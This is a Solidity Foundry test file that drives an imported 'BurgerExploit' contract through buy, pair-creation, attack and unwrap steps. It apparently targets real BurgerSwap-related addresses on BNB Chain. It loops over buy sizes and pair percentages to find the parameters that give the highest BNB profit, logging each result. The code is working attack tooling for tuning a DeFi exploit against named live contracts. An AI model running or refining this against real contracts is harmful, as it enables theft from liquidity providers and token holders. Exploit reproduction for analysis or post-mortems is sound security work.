// SPDX-License-Identifier: MIT
pragma solidity ^0.8.23;

import "forge-std/Test.sol";
import "../exploit/BurgerExploit.sol";

contract BurgerTest7 is Test {
    address constant WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
    address constant BURGER = 0xAe9269f27437f0fcBC232d39Ec814844a51d6b8f;
    address constant PLATFORM = 0xBf6527834dBB89cdC97A79FCD62E6c08B19F8ec0;

    function test_optimize() public {
        // Find optimal buy and pair pct around the profitable zone
        uint256[6] memory buyAmounts = [uint256(4000 ether), uint256(5000 ether), uint256(6000 ether), uint256(7000 ether), uint256(8000 ether), uint256(10000 ether)];
        uint256[6] memory pairPcts = [uint256(5), uint256(7), uint256(8), uint256(10), uint256(12), uint256(15)];

        for (uint256 b = 0; b < buyAmounts.length; b++) {
            for (uint256 p = 0; p < pairPcts.length; p++) {
                _run(buyAmounts[b], pairPcts[p]);
            }
        }
    }

    function _run(uint256 buyAmount, uint256 pairPct) internal {
        address att = makeAddr("att");
        uint256 startBnb = buyAmount + 500 ether;
        vm.deal(att, startBnb);
        vm.startPrank(att);

        BurgerExploit e = new BurgerExploit();
        e.step1_setup{value: buyAmount + 200 ether}();

        try e.step2_buyBurger(buyAmount) {} catch {
            emit log_string(string.concat("buy=", vm.toString(buyAmount / 1 ether), " pct=", vm.toString(pairPct), " FAILED at buy"));
            vm.stopPrank();
            return;
        }

        uint256 bBal = IERC20(BURGER).balanceOf(address(e));
        uint256 forPair = bBal * pairPct / 100;
        if (forPair < 1000) forPair = 1000;

        try e.step3_createPair(100 ether, forPair) {} catch {
            emit log_string(string.concat("buy=", vm.toString(buyAmount / 1 ether), " pct=", vm.toString(pairPct), " FAILED at create"));
            vm.stopPrank();
            return;
        }

        try e.step4_attack(50 ether) {} catch {
            emit log_string(string.concat("buy=", vm.toString(buyAmount / 1 ether), " pct=", vm.toString(pairPct), " FAILED at attack"));
            vm.stopPrank();
            return;
        }

        e.step5_unwrap();

        int256 profit = int256(att.balance) - int256(startBnb);
        string memory pSign = profit >= 0 ? "+" : "-";
        uint256 absProfit = profit >= 0 ? uint256(profit) : uint256(-profit);
        emit log_string(string.concat(
            "buy=", vm.toString(buyAmount / 1 ether),
            " pct=", vm.toString(pairPct),
            " profit=", pSign, vm.toString(absProfit / 1 ether), " BNB"
        ));

        vm.stopPrank();
    }
}
